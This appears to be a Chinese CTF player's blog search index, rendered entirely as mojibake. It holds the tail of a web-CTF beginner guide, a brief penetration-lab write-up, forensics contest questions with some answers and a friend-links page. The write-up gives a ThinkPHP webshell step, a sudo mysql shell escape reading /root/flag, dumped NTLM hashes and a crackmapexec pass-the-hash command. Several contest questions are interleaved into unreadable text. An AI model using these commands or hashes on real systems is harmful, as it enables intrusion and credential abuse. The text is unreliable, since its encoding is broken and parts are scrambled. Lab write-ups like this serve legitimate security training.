SwitchyOmegaã€Wappalyzerï¼‰ æœ¬åœ°ä»£ç ç¼–è¾‘å™¨:visual studio codeã€pycharmã€phpstormç­‰ å¸¸ç”¨å·¥å…·å‡†å¤‡å¥½ï¼šBurp Suiteï¼ˆæŠ“åŒ…ç¥å™¨ï¼‰PHPStudyï¼ˆæœ¬åœ°è·‘ç½‘ç«™ï¼‰dirsearchï¼ˆç›®å½•çˆ†ç ´ï¼‰AntSword å…¶ä»–æ¨èï¼šEverythingï¼ˆå¿«é€Ÿæ‰¾æ–‡ä»¶ï¼‰fofaï¼ˆä¿¡æ¯æ”¶é›†ç¥å™¨ï¼‰cmd5ã€ç«™é•¿ä¹‹å®¶ï¼ˆåŸºç¡€æŸ¥è¯¢å·¥å…·) Tipï¼šè¿™äº›å·¥å…·å¹¶ä¸éœ€è¦ä½ ä¸€æ¬¡ä¸‹å®Œï¼Œéƒ½æ˜¯åœ¨ä½ åšé¢˜è¿‡ç¨‹ä¸­é€æ¸ç§¯ç´¯çš„ æŒæ¡åŸºç¡€çŸ¥è¯†HTTPåè®®ï¼šç†è§£è¯·æ±‚å¤´ã€å“åº”ä½“ã€å„ç§è¯·æ±‚æ–¹æ³•ï¼ˆGETPOST) ç¼–ç ä¸åŠ è§£å¯†ï¼šbase64ã€URLç¼–ç ã€hash ç­‰ï¼Œææ¸…æ¥šå®ƒä»¬ä»€ä¹ˆæ—¶å€™å‡ºç°ã€æ€ä¹ˆè¯†åˆ«ã€æ€ä¹ˆè¿˜åŸã€‚ èº«ä»½è®¤è¯ï¼šcookieã€sessionã€jwt å‰ç«¯ï¼šhtmlã€cssã€javascriptï¼ˆå¾ˆé‡è¦ï¼‰ åç«¯:php,pythonç­‰ æ–°æ‰‹æœ€å¸¸è§çš„å°±æ˜¯phpï¼Œphpéå¸¸çµæ´»å®¹æ˜“è¢«åˆ©ç”¨ è„šæœ¬è¯­è¨€:pythonï¼Œwebå¸¸ç”¨çš„å°±æ˜¯çˆ¬è™« åˆ·é¢˜æ‰“æ¯”èµ›åˆ·é¢˜å¹³å°: NSSCTF(æˆ‘ä»¬å›¢é˜Ÿè‡ªä¸»å¼€å‘çš„å¹³å°)https://www.nssctf.cn/ ctfhubï¼šhttps://www.ctfhub.com/ bugkuï¼šhttps://ctf.bugku.com/ buuctfï¼šhttps://buuoj.cn/ (ä¸Šé¢çš„é¢˜ç›®è¾ƒéš¾ï¼Œé€‚åˆä¸­æœŸwebæ‰‹ç»ƒä¹ ) ç­‰ç­‰ ç»ƒä¹ å»ºè®®ï¼šæ‰“ä¸€ä¸ªé¢˜ â†’ æŸ¥ WPï¼ˆwriteupï¼‰ â†’ å­¦ä¸€ä¸ªæ¼æ´ â†’ æ‰“ä¸€ç±»é¢˜ â†’ å†çœ‹WP è®°åœ¨ç¬”è®°ä¸­ ä¸è¦â€œä¹±æ‰“â€ï¼Œä¸€å®šè¦ææ‡‚æ¼æ´åŸç†å’Œåˆ©ç”¨æ¡ä»¶ å››ã€æ¼æ´åŸºç¡€æ¼æ´SQLæ³¨å…¥ XSS CSRF SSRF æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶åŒ…å« PHP ååºåˆ—åŒ– è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE) SSTI XXE åŸå‹é“¾æ±¡æŸ“ å…¶ä»–è¿›é˜¶Javaååºåˆ—åŒ–ã€æ²™ç®±é€ƒé€¸â€¦â€¦è¿™äº›åˆå­¦å¯ä»¥è·³è¿‡ï¼Œä½†æ—©æ™šè¦é¢å¯¹çš„ç»ˆæBOSS äº”ã€æœ€ç»ˆå»ºè®®å¤šçœ‹ä¹¦ï¼Œå¤šçœ‹ç¤¾åŒºï¼ˆCTF-Wikiã€å…ˆçŸ¥ã€Freebufï¼‰ å¤šåŠ¨æ‰‹ï¼Œå…‰çœ‹æ˜¯ä¸å¤Ÿçš„ å¤šåŠ ç¤¾ç¾¤ï¼Œæ‰¾å¤§ä½¬æŒ‡ç‚¹ å¤šæ€»ç»“ï¼Œè®°å½•ä½ ç»ƒè¿‡çš„é¢˜å’Œè¸©è¿‡çš„å‘ å¿ƒæ€éå¸¸é‡è¦ï¼Œæ°¸è¿œä¸è¦è§‰å¾—â€œå¤ªéš¾â€ ç›¸ä¿¡å½“ä½ æˆåŠŸæ‹¿åˆ°flagçš„é‚£ä¸€åˆ»çš„æ„Ÿå—æ˜¯æ— ä»¥ä¼¦æ¯”çš„ï¼åŠ æ²¹å°é»‘å®¢ï¼Œwebçš„å¤§é—¨å·²ä¸ºä½ æ•å¼€ï¼Œå¼€å¯ä½ çš„è¯•ç»ƒå§ï¼"},{"path":"/images/æ˜¥ç§‹äº‘é•œ.html","content":"æ˜¥ç§‹äº‘é•œInitialthinkphpå†™é©¬+sudoææƒé¦–å…ˆæ‹¿åˆ°é¶æœºå‘ç°å¾ˆæ˜æ˜¾çš„å›¾æ ‡ ä»–æ˜¯thinkphp æ‹¿å·¥å…·æ‰«ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´ å·¥å…·é¡¹ç›®åœ°å€ https://github.com/Lotus6/ThinkphpGUI antsowrdè¿ä¸Šåå‘ç°æƒé™å¾ˆä½ï¼Œè€ƒè™‘ææƒ å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ äºæ˜¯sudo -lçœ‹ä¸‹ sudo -lå‘ç°mysqlæœ‰sudoæƒé™ ææƒæ–¹å¼https://gtfobins.github.io/gtfobins/mysql/ sudo mysql -e \\! whoamisudo mysql -e \\! cat /root/flag/f* ä¸Šè¿°æ–¹å¼è¯»åˆ°flag1 ä¸Šä¼ fscanæ‰«ä¸€ä¸‹å†…ç½‘ ä¿¡å‘¼OA-nday vim /etc/proxychains4.confsocks5 47.109.207.123 8080 [rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 5141106 Marcus e07510a4284b3c97c8e7dee970918c5c 5121107 Charles f6a9881cd5ae709abb4ac9ab87f24617 5121000 DC01$ be73a3937f16c08213f2527a2a89c36d 532480500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 5121104 XIAORANG-OA01$ 460c1668eac8c49ab011928b57dc6d42 40961108 XIAORANG-WIN7$ cd12cb01c093cbb210ea30fda776cff8 4096 proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x type Users\\Administrator\\flag\\flag03.txt Brute4Road"},{"path":"/images/é¢˜å¹²ï¼ˆå¿…å¡«ï¼‰.html","content":"åˆ†ææ‰‹æœºé•œåƒï¼Œå«Œç–‘äººç”µè„‘çš„å¼€æœºå¯†ç æ˜¯å¤šå°‘ï¼Ÿ[æŒ‰ç…§å®é™…å€¼å¡«å†™] qwe321@ åˆ†æWindowsæ£€æï¼ŒPowerShellä¸­å¤šå°‘ä¸ªå‘½ä»¤å…³è”URLåœ°å€(ä¸å»é‡)ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123] 5 åˆ†æWindowsæ£€æï¼ŒVeraCryptåŠ å¯†å®¹å™¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šv10.1.1] å®¹å™¨å¯†ç ï¼šUJw4FspAsmNVRACWf4GQazvd åˆ†æWindowsæ£€æï¼ŒåŠ å¯†å®¹å™¨ä¸­å¯†ç æœ¬.txtæ–‡ä»¶ä¸­çš„sha256åå…­ä½æ˜¯å¤šå°‘ åˆ†æWindowsæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œåˆ†æå…¶è´¦å•æ•°æ®ä¸­å“ªä¸ªç±»åˆ«çš„é‡‘é¢æœ€å¤šï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šæ ¹æ®å®é™…å€¼å¡«å†™] åˆ†æWindowsæ£€æï¼ŒBitlockerçš„æ¢å¤å¯†é’¥å‰6ä½æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123456] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººä½¿ç”¨çš„Windowsæ¿€æ´»å·¥å…·çš„ç‰ˆæœ¬æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šv10.1.1] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººç”µè„‘ä¸­å®‰è£…çš„åŠ å¯†è½¯ä»¶ï¼ˆéVeraCryptï¼‰ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1.2.3] åˆ†æWindowsæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯¥åŠ å¯†è½¯ä»¶æ¢å¤ç§˜é’¥æ–‡ä»¶æœ€åä¸€ä¸ªå•è¯æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šæ ¹æ®å®é™…å€¼å¡«å†™] åˆ†æWindowsæ£€æï¼Œmysqlæ•°æ®åº“ç‰©ç†è·¯å¾„ åˆ†æWindowsæ£€æï¼Œå¯¹æ¯”æ•°æ®åº“ä¸çˆ¬å»å°è¯´æ•°æ®ï¼Œæ•°æ®åº“ä¸­ç¼ºå°‘çš„å°è¯´å…¶å…±æœ‰å¤šå°‘ç« èŠ‚ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººçˆ¬å–çš„å°è¯´å…±æœ‰å¤šå°‘æ±‰å­—ï¼ˆåŒ…æ‹¬ç¹ä½“æ±‰å­—ï¼Œä¸è®¡æ ‡ç‚¹ç¬¦å·ï¼‰ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººä¸ºèº²é¿ä¾µæƒï¼Œå°†çˆ¬å–æ–‡æœ¬ä¸­å¤šä¸ªä¸åŒæ±‰å­—åˆ†åˆ«æ›¿æ¢æˆå¦ä¸€äº›æ±‰å­—ï¼ˆå¦‚â€œæˆ‘â€â†’â€œçªâ€åˆ†ï¼‰æï¼ŒWåˆ†indæoå…±wsæœ‰æ£€å¤šæå°‘ï¼Œä¸ªå¯¹ä¸æ¯”åŒçˆ¬æ±‰å–å­—æ•°è¢«æ®æ›¿ä¸æ¢æ›¿ï¼ˆæ¢ç›¸æ•°åŒæ®å­—ï¼Œä»…è¢«è®¡æ›¿ä¸€æ¢æ¬¡æ±‰ï¼‰å­—ï¼Ÿï¼ˆ[æ ‡ä¸å‡†å»æ ¼é‡å¼ï¼‰ï¼šæ•°1é‡2æœ€3]å¤šçš„æ–‡ä»¶åç§°æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šç¬¬0001ç« .txt] åˆ†æWindowsæ£€æï¼Œå¯¹æ¯”çˆ¬å–æ•°æ®ä¸æ›¿æ¢æ•°æ®ï¼Œæ˜¯å¦å­˜åœ¨å®Œå…¨æ²¡æœ‰æ±‰å­—è¢«æ›¿æ¢çš„æ–‡ä»¶ï¼Ÿè‹¥å­˜åœ¨ï¼Œè¯·ç»™å‡ºæ–‡ä»¶çš„æ•°é‡ï¼›è‹¥ä¸å­˜åœ¨ï¼Œè¯·ç›´æ¥å¡«å†™â€œå¦â€ã€‚[æ ‡å‡†æ ¼å¼ï¼š123 æˆ–è€… å¦] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººä½¿ç”¨çš„é»˜è®¤æµè§ˆå™¨åç§°æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šMicrosoft Edge] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººä½¿ç”¨çš„AIç½‘ç«™çš„ç«¯å£æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººä½¿ç”¨çš„AIç½‘ç«™ç™»å½•å¯†ç æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šæ ¹æ®å®é™…å€¼å¡«å†™] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººåˆ©ç”¨åœ¨çº¿AIæ¨¡ä»¿åˆ›ä½œçš„å°è¯´ï¼Œå…¶ç¬¬äº”ç« æ ‡é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šæ ¹æ®å®é™…å€¼å¡«å†™]åˆ†æWindowsæ£€æï¼Œç»ˆç‚¹å°è¯´åˆæ­¥è¦æ±‚å«Œç–‘äººèµ”å¿çš„ç»æµæŸå¤±é‡‘é¢ä¸ºå¤šå°‘ä¸‡å…ƒäººæ°‘å¸ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š123] åˆ†æWindowsæ£€æï¼Œæ ¹æ®å¾‹å¸ˆå‡½è¦æ±‚ï¼Œå«Œç–‘äººæœ€æ™šé¡»äºå‡ æœˆå‡ æ—¥ï¼ˆå«å½“æ—¥ï¼‰å‰å‘ç»ˆç‚¹å°è¯´æäº¤ç»å®¡æ ¸åŒæ„çš„ä¹¦é¢è‡´æ­‰å‡½ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š10æœˆ12æ—¥] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººNASæ˜ å°„çš„ç›˜ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šC] åˆ†æWindowsæ£€æï¼Œå«Œç–‘äººå½“æ—¶æ­£åœ¨é˜…è¯»çš„å°è¯´å«ä»€ä¹ˆåå­—ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šä¸‰å›½æ¼”ä¹‰] åˆ†æWindowsæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œå«Œç–‘äººå½“å‰çœ‹åˆ°è¯¥å°è¯´çš„ç¬¬å‡ ç« ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šç¬¬ä¸€ç« ] è¯·åˆ†æExsiè™šæ‹ŸåŒ–å¹³å°æ˜¯ä»€ä¹ˆæ—¶å€™å®‰è£…çš„ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š20250102-101258ï¼Œå¹´æœˆæ—¥-æ—¶åˆ†ç§’ï¼ŒåŒ—äº¬æ—¶é—´] è¯·åˆ†æExsiè™šæ‹ŸåŒ–å¹³å°è™šæ‹Ÿæœºä½¿ç”¨çš„ISOé•œåƒå¤§å°æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š2.58ï¼Œå•ä½ï¼šGigabyte] è¯·åˆ†ænasæœåŠ¡å™¨sambaåº”ç”¨å®Œæ•´ç‰ˆæœ¬æ ‡è¯†ä¸ºï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1.18.26-10.el6_5] è¯·å«Œåˆ†ç–‘æäººnåœ¨ansaæœsåŠ¡æœåŠ¡å™¨å™¨saä¸­mbåˆ aé™¤åº”äº†ç”¨é¢å…±æ¿äº«æ—¥ç›®å¿—å½•ï¼Œå…è¯·è®¸åˆ†è®¿æé—®å…¶çš„åˆ ç”¨é™¤æˆ·æ—¥åå¿—ä¸ºåï¼Ÿç¬¬[æ ‡ä¸€å‡†æ¬¡æ ¼è®¿å¼é—®ï¼šæœgåŠ¡yså™¨66çš„6]ç›®å½•ç‰©ç†è·¯å¾„æ˜¯ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼švarsoftwegame] æŸç”¨æˆ·åœ¨â€œ2025-10-21 18:40:53ï¼ˆåŒ—äº¬æ—¶é—´ï¼‰â€å‘æœ¬åœ°AIæ¨¡å‹æé—®ï¼Œè¯·é—®å…¶ä¸€å…±æé—®äº†å‡ æ¬¡ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š5]æ¥ä¸Šé¢˜ï¼Œç¬¬äºŒè½®äº¤äº’æ€»è®¡Token Consumptionï¼ˆä»¤ç‰Œæ¶ˆè€—ï¼‰å¤šå°‘ä¸ªï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š10] è¯·åˆ†æAå¡Iæ¨¡å¯†å‹ç½‘åœ¨ç«™åˆ›ä¼šå»ºéš”æ—¶ä¸€æ³¨æ®µå†Œæ—¶çš„é—´ç®¡ä¼šç†è‡ªå‘˜åŠ¨è´¦åˆ å·é™¤çš„åå¤´å°åƒç®¡æ˜¾ç†ç¤ºå‘˜çš„ç™»æ•°å½•å­—æ—¥æ˜¯å¿—ï¼Ÿï¼Œ[è¯·æ ‡é—®å‡†æ—¥æ ¼å¿—å¼æœ€ï¼šå¤š15ä¿]å­˜å¤šå°‘å°æ—¶ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š10ï¼Œå•ä½ï¼šå°æ—¶ï¼Œå››èˆäº”å…¥] è¯·åˆ†æå¡å¯†ç½‘ç«™åå°ç®¡ç†å‘˜ç™»å½•æˆåŠŸåå¤šå°‘å°æ—¶å†…æ— éœ€é‡æ–°ç™»å½•ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š8ï¼Œå•ä½ï¼šå°æ—¶] è¯·åˆ†æå¡å¯†ç½‘ç«™å¾®ä¿¡æ¥å£é…ç½®çš„Appsecretæ˜¯ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šå­—ç¬¦ä¸²ï¼Œå…¨å°å†™] è¯·åˆ†æå¡å¯†ç½‘ç«™ç®¡ç†å‘˜æ³¨å†Œäº†ä¸€ä¸ªå•†æˆ·è´¦å·ï¼Œè¯·é—®å•†æˆ·ç¼–å·æ˜¯ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š10000] æ¥ä¸Šé¢˜ï¼Œè¯·ä¸åˆ†è€ƒæè™‘è¯¥å¹³å•†å°æˆ·ææŒç°çµã€ä»˜ç½‘å¾®å…³ä¿¡é€šæ‰«é“ç è´¹è®¾ç”¨ç½®çš„çš„æƒ…è´¹å†µç‡ä¸‹æ˜¯ï¼Œå¤šå”®å°‘å–ï¼Ÿçš„[å¡æ ‡å¯†å‡†å…±æ ¼è®¡å¼å‡€ï¼šåˆ©1%å¤š]å°‘å…ƒï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1888.88ï¼Œå•ä½ï¼šäººæ°‘å¸] å«Œç–‘äººå°†å¡å¯†ç½‘ç«™çš„æ•°æ®å®šæ—¶å¤‡ä»½è‡³è¿œç¨‹æœåŠ¡å™¨ï¼Œè¯·é—®è¿œç¨‹æœåŠ¡å™¨IPä¸ºï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š8.8.8.8] å«Œç–‘äººä¾›è¿°webè™šæ‹Ÿæœºå‚¨å­˜äº†ä¸€æœ¬åä¸ºâ€œæ´»åœ¨æ˜æœâ€çš„å°è¯´ï¼Œå·²ç»åˆ é™¤å¿˜è®°æ€ä¹ˆæ¢å¤äº†ï¼Œè¯·æ‰¾åˆ°è¯¥å°è¯´å¹¶åˆ†æä¸€å…±æœ‰å¤šå°‘ç« ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š100] æ¥æœ‰ä¸Šä¸€é¢˜ä¸ªï¼Œå¤–å°éƒ¨è¯´ç¨‹æ˜¯åºä»€â€œä¹ˆèŠ¯æ—¶é¾™å€™çŸ­åˆ ç‰‡é™¤â€çš„è·Ÿï¼Ÿwe[æ ‡bæœå‡†åŠ¡æ ¼å™¨å¼åª’ï¼šä½“20ç³»2ç»Ÿ50è¿›10è¡Œ2é€š-1ä¿¡01ï¼Œ25è¯·8åˆ†ï¼Œæå¹´å…¶æœˆAæ—¥P-Iæ—¶é€šåˆ†ä¿¡ç§’å¯†ï¼Œé’¥åŒ—ä¸ºäº¬ï¼Ÿæ—¶[æ ‡é—´å‡†]æ ¼å¼ï¼šå­—ç¬¦ä¸²ï¼Œå…¨å°å†™] æ¥ä¸Šé¢˜ï¼Œåª’ä½“ç³»ç»Ÿç®¡ç†å‘˜æœ€åç™»å½•çš„æ—¶é—´ä¸ºï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š20250102-101258ï¼Œå¹´æœˆæ—¥-æ—¶åˆ†ç§’ï¼ŒåŒ—äº¬æ—¶é—´] è¯·åˆ†æå°è¯´ç½‘ç«™â€œå‡è¿ä¹‹è·¯â€å°è¯´ç¬¬47ç« å«ä»€ä¹ˆåå­—ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šä½ å¥½å‘€] è¯·åˆ†æå°è¯´ç½‘ç«™å°è¯´åå°é‡‡é›†æ¥æºåœ°å€æ˜¯ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šbaidu.com] è¯·åˆ†æå°è¯´ç½‘ç«™æŸç”¨æˆ·è¯„è®ºâ€œå¥½ä¸œè¥¿å¤§å®¶é¡¶â€æ˜¯å“ªç¯‡å°è¯´ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šè‹å¤§å¼º] è¯·å«Œåˆ†ç–‘æäººå°æ›¾è¯´åœ¨wç½‘eç«™bæœå¯¹åŠ¡æ¥å™¨çš„ä¸­ç¬¬ç‰¹ä¸‰å®šæ–¹ä½æ”¯ç½®ä»˜æ‰§æ¥è¡Œå£é‡‡çš„é›†å•†æ­£æˆ·ç‰ˆå¯†ï¼ˆé’¥æ”¶æ˜¯è´¹ï¼Ÿ[ï¼‰æ ‡å°å‡†è¯´æ ¼çš„å¼è„šï¼šæœ¬å®Œï¼Œæ•´è¯·å­—åˆ†ç¬¦æä¸²é‡‡ï¼Œé›†åŒºçš„åˆ†æ­£å¤§ç‰ˆå°å°å†™è¯´] ç½‘å€æ˜¯ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šwww.baidu.com] å«Œç–‘äººæ›¾åœ¨webæœåŠ¡å™¨ä¸­å¤‡ä»½æ•´å¥—é¢æ¿æ•°æ®ï¼Œè¯·é—®é¢æ¿å¤‡ä»½æ•°æ®åŒ…SHA256å€¼ä¸ºï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™] æ”»å‡»æœºçš„ipæ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š111.111.111.111] è¢«æ”»å‡»ç½‘ç«™æœåŠ¡å™¨å¼€æ”¾ç«¯å£æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1] æ”»å‡»è€…å¯¹å‚æ•°fuzzingæˆåŠŸæ•°é‡æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1] æ”»å‡»è€…åœ¨ç½‘ç«™æœåŠ¡å™¨ä¸Šä¼ äº†ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè¿›è¡Œäº†åˆ›å»ºæ–‡ä»¶æ“ä½œï¼Œæ–°æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼ša.txt] æ”»å‡»è€…å¯¹ç½‘ç«™å†…å®¹è¿›è¡Œäº†ä¿®æ”¹ï¼Œæ·»åŠ æ¶æ„é“¾æ¥æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šhttp://www.baidu.com/index.php] åˆ†å‘æ¶æ„æ–‡ä»¶åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šbaidu.com] è¢«æ§(è®¿é—®äº†è¢«ä¿®æ”¹åçš„ç½‘ç«™)ä¸»æœºipæ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š111.111.111.111] æ”»å‡»è€…çš„license-idæ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šè¯·å¡«å†™å®é™…å€¼] æ”»å‡»è€…çš„ç§˜å¯†æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šå…­ä½å°å†™å­—æ¯_å…­ä½æ•°å­—] è¢«æ§ä¸»æœºè¿è¡Œçš„å­˜å‚¨æœåŠ¡ï¼ŒåŠå…¶ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼šamazon_s3:114] è¢«æ§ä¸»æœºæœ€ç»ˆå‘è¿œæ§ä¸»æœºå‘é€å¿ƒè·³åŒ…æ—¶é—´é—´éš”æ˜¯å¤šå°‘ï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š1s] è¢«æ§ä¸»æœºå­˜å‚¨æ¡¶ä¸­æ–‡ä»¶md5å€¼æ˜¯ä»€ä¹ˆï¼Ÿ[æ ‡å‡†æ ¼å¼ï¼š32ä½å°å†™æ•°å­—å­—æ¯]"},{"title":"Friendlinks","path":"/links/index.html","content":"Friendlinks åœŸè±†çŒ« åœŸè±†æ¥äº†~ Samsara è¶…å¼ºçš„REæ‰‹æ heyi404 WEBå¥½é˜Ÿå‹ãƒ½(âœ¿ï¾Ÿâ–½ï¾Ÿ)ãƒ Harukaze ä¸€åªæ²‰è¿·galçš„Reæ‰‹ Reisen Reå¤§æ‰‹!æ ¡é˜Ÿå¥½å‹O(âˆ©_âˆ©)O .friend-links { display: flex; flex-wrap: wrap; gap: 20px; } .friend-link { width: 200px; text-align: center; border: 1px solid #ddd; border-radius: 12px; padding: 15px; background: #fafafa; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05); transition: transform 0.2s ease, box-shadow 0.2s ease; } .friend-link:hover { transform: translateY(-5px); box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); } .friend-link a { text-decoration: none; color: #333; } .friend-link a:hover { text-decoration: none; color: #111; } .friend-link img { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; margin-bottom: 10px; } .friend-link p { margin: 5px 0; font-size: 14px; }"}]